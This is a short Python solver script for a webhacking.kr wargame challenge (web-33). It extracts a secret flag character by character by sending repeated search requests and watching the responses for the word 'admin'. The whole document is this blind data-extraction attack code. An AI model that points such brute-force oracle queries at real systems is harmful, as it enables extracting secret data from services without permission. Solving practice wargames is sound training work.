import requests

url = "https://webhacking.kr/challenge/web-33/index.php"

ans = "flag{"
params = {"search": ans}

res = requests.post(url, data = params)

for _ in range(50):
	for i in range(48, 127):
		params["search"] = ans + chr(i)	
		res = requests.post(url, data = params)
	
		if ("admin" in res.text):
			ans += chr(i)
			print(ans)
			break
	if (chr(i) == '}'): break
